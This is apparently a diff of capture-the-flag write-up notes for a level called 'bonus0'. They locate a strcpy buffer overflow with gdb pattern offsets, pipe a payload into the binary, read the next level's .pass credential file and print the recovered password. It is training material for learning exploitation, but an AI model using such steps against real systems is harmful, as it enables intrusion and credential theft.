@@ -1,0 +1,24 @@
+Strcpy is vulnerable to Buffer Overflow
+0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
+
+# Let's find a which offset the program segfault
+gdb> pattern create 100
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+gdb> r
+ -
+ AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
+ -
+ AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
+SIGSEGV
+gdb> pattern search
+[...]
+Registers contain pattern buffer:
+EBP+0 found at offset: 9
+EIP+0 found at offset: 13
+[...]
+
+# Now we need to know if the offset correspond to the first or the second string
+
+$> cat /tmp/payload  - | ./bonus0
+> cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
